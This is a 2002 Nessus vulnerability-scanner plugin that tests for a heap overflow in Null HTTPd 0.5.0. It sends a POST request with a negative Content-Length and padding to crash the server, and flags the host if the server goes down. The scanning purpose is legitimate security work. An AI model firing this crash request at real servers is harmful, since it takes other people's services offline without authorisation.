#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#
########################
# References:
########################
#
# Date:  Sun, 22 Sep 2002 23:19:48 -0000
# From: "Bert Vanmanshoven" <sacrine@netric.org>
# To: bugtraq@securityfocus.com
# Subject: remote exploitable heap overflow in Null HTTPd 0.5.0
# 
########################
#
# Vulnerables:
# Null HTTPD 0.5.0
#

if(description)
{
 script_id(11183);
 script_version("$Revision: 1.6 $");
 
 name["english"] = "HTTP negative Content-Length buffer overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
We could crash the web server by sending an invalid POST
HTTP request with a negative Content-Length field.

A cracker may exploit this flaw to disable your service or
even execute arbitrary code on your system.

Risk factor : High

Solution : Upgrade your web server";

 script_description(english:desc["english"]);
 
 summary["english"] = "NullHttpd web server crashes if Content-Length is negative";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "httpver.nasl");
 script_require_ports("Services/www",80);
 exit(0);
}

#

include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

if(http_is_dead(port:port))exit(0);


soc = http_open_socket(port);
if (! soc) exit(0);

# Null HTTPD attack
req = string("POST / HTTP/1.0\r\nContent-Length: -800\r\n\r\n", crap(500), "\r\n");
send(socket:soc, data: req);
r = http_recv(socket: soc);
http_close_socket(soc);


#
if(http_is_dead(port: port))
{
  security_hole(port);
}
